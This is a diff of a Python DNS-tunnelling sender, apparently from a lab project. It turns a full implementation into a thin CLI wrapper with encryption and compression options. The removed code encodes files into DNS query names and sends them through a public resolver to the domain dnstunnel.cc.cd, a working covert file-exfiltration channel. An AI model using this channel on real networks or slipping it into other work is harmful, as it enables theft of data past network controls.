@@ -2,124 +2,96 @@
 """
 Encoder - DNS tunnelling sender (lab / own-machine testing only)
 
-Usage:
-    python3 encoder.py secret.txt
-    python3 encoder.py secret.txt --server 8.8.8.8 --port 53
-    python3 encoder.py secret.txt --server 127.0.0.1 --port 5353
+Thin CLI wrapper around app.protocol.send_file().
 
-Change only FILE_PATH below, or pass the file as an argument.
-Test only with your own files, from your own machine, to a server
-you own (your dnstunnel.cc.cd nameserver). Never point this at
-someone else's machine or network.
+Usage:
+    python encoder.py examples/secret.txt
+    python encoder.py examples/secret.txt --server 127.0.0.1 --port 5353
+    python encoder.py examples/secret.txt --server 10.144.144.89 --password hunter2
+
+Test only with your own files, from your own machine, to a server you own.
+Never point this at someone else's machine or network.
 """
 
+from __future__ import annotations
+
 import argparse
-import base64
-import hashlib
-import json
-import random
-import socket
-import struct
 import sys
 
-# --- Change these for your test ---
-FILE_PATH = "secret.txt"              # default file, overridden by argument
-DOMAIN = "dnstunnel.cc.cd"           # your domain
-SERVER = "8.8.8.8"                    # public resolver, or your decoder IP
-PORT = 53                             # 53 for real DNS, 5353 for local test
-DELAY = 0.2                           # seconds between queries
-TIMEOUT = 2.0                         # seconds to wait for an ACK
-MAX_RETRIES = 3
-CHUNK_SIZE = 32                       # chars per DNS label, under 63 limit
+from app import config, protocol
 
 
-def build_stream(file_bytes, filename):
-    header = {
-        "filename": filename,
-        "size": len(file_bytes),
-        "sha256": hashlib.sha256(file_bytes).hexdigest(),
-    }
-    raw = json.dumps(header, separators=(",", ":")).encode() + b"\n" + file_bytes
-    return base64.b32encode(raw).decode().rstrip("=").lower()
-
-
-def build_dns_query(qname, qid):
-    header = struct.pack(">HHHHHH", qid, 0x0100, 1, 0, 0, 0)
-    question = b""
-    for label in qname.split("."):
-        encoded = label.encode()
-        assert len(encoded) <= 63, f"label too long: {label!r}"
-        question += struct.pack("B", len(encoded)) + encoded
-    question += b"\x00" + struct.pack(">HH", 1, 1)  # QTYPE A, QCLASS IN
-    assert len(qname) <= 253, "name exceeds 253-char DNS limit"
-    return header + question
-
-
-def send_query(sock, qname, server, port):
-    qid = random.randint(0, 65535)
-    packet = build_dns_query(qname, qid)
-    for attempt in range(MAX_RETRIES):
-        try:
-            # IPv6 sendto needs a 4-tuple: (server, port, flowinfo, scopeid)
-            dest = (server, port, 0, 0) if sock.family == socket.AF_INET6 else (server, port)
-            sock.sendto(packet, dest)
-            sock.settimeout(TIMEOUT)
-            resp, _ = sock.recvfrom(512)
-            resp_qid = struct.unpack(">H", resp[:2])[0]
-            if resp_qid == qid:
-                return True
-        except socket.timeout:
-            continue
-    return False
-
-
-def main():
+def main(argv: list[str] | None = None) -> int:
     parser = argparse.ArgumentParser(description="Encode a file into DNS queries")
-    parser.add_argument("file", nargs="?", default=FILE_PATH,
+    parser.add_argument("file", nargs="?", default="secret.txt",
                         help="file to encode and send (default: %(default)s)")
-    parser.add_argument("--server", default=SERVER)
-    parser.add_argument("--port", type=int, default=PORT)
-    parser.add_argument("--delay", type=float, default=DELAY)
-    args = parser.parse_args()
+    parser.add_argument("--server", default=config.DEFAULT_SERVER,
+                        help="decoder IP (default: %(default)s)")
+    parser.add_argument("--port", type=int, default=config.DEFAULT_PORT,
+                        help="decoder UDP port, 53 needs Admin/sudo (default: %(default)s)")
+    parser.add_argument("--delay", type=float, default=protocol.DEFAULT_DELAY,
+                        help="seconds between chunks (default: %(default)s)")
+    parser.add_argument("--timeout", type=float, default=protocol.TIMEOUT,
+                        help="ACK timeout per try (default: %(default)s)")
+    parser.add_argument("--password", default=None,
+                        help="encrypt the stream with this password")
+    parser.add_argument("--no-compress", action="store_true",
+                        help="skip zlib compression even above 1 KB")
+    parser.add_argument("--domain", default=protocol.DOMAIN,
+                        help="tunnel suffix (default: %(default)s)")
+    args = parser.parse_args(argv)
+
+    def on_event(event: dict) -> None:
+        kind = event["type"]
+        if kind == "start":
+            layers = "compressed" if event["compressed"] else "raw"
+            if event["encrypted"]:
+                layers += " + encrypted"
+            print(
+                f"File: {event['filename']} ({event['size']} bytes, "
+                f"sha256 {event['sha256'][:12]}..., {layers})"
+            )
+            print(
+                f"Sending {event['chunks']} chunks to {args.domain} via "
+                f"{event['server']}:{event['port']}, session {event['session']}"
+            )
+        elif kind == "retry":
+            print(f"  chunk {event['seq']:03d}: no ACK, try {event['attempt']}")
+        elif kind == "chunk_failed":
+            print(f"  chunk {event['seq']:03d}: no ACK after {event['attempts']} tries")
+        elif kind == "end":
+            if not event["acked"]:
+                print("END query got no ACK, receiver may still have all chunks")
+        elif kind == "done":
+            print(
+                f"Done: {event['sent']}/{event['total']} chunks sent, END sent "
+                f"in {event['elapsed']:.2f}s"
+            )
+        elif kind == "cancelled":
+            print(f"Cancelled after {event['sent']}/{event['total']} chunks")
+        elif kind == "error":
+            print(f"Error: {event['message']}")
 
     try:
-        with open(args.file, "rb") as f:
-            file_bytes = f.read()
+        result = protocol.send_file(
+            args.file,
+            args.server,
+            args.port,
+            delay=args.delay,
+            password=args.password,
+            compress=not args.no_compress,
+            timeout=args.timeout,
+            domain=args.domain,
+            on_event=on_event,
+        )
     except FileNotFoundError:
         print(f"File not found: {args.file}")
-        sys.exit(1)
-
-    filename = args.file.split("/")[-1].split("\\")[-1]
-    stream = build_stream(file_bytes, filename)
-    chunks = [stream[i:i + CHUNK_SIZE] for i in range(0, len(stream), CHUNK_SIZE)]
-    session = f"{random.randint(0, 999999):06d}"
-
-    print(f"File: {filename} ({len(file_bytes)} bytes, sha256 {hashlib.sha256(file_bytes).hexdigest()[:12]}...)")
-    print(f"Sending {len(chunks)} chunks to {DOMAIN} via {args.server}:{args.port}, session {session}")
-
-    # IPv6 if the server looks like an IPv6 address, else IPv4
-    family = socket.AF_INET6 if ":" in args.server else socket.AF_INET
-    sock = socket.socket(family, socket.SOCK_DGRAM)
-    sent = 0
-    for i, chunk in enumerate(chunks, start=1):
-        qname = f"{i:03d}.{chunk}.{session}.{DOMAIN}"
-        if send_query(sock, qname, args.server, args.port):
-            sent += 1
-        else:
-            print(f"Chunk {i:03d} failed after {MAX_RETRIES} retries, stopping")
-            break
-        if args.delay:
-            import time
-            time.sleep(args.delay)
-
-    if sent == len(chunks):
-        qname = f"END.{session}.{DOMAIN}"
-        if send_query(sock, qname, args.server, args.port):
-            print(f"Done: {sent}/{len(chunks)} chunks sent, END sent")
-        else:
-            print("END query got no ACK, receiver may still have all chunks")
-    sock.close()
+        return 1
+    except OSError as exc:
+        print(f"Network error: {exc}")
+        return 1
+    return 0 if result["ok"] else 1
 
 
 if __name__ == "__main__":
-    main()
+    sys.exit(main())
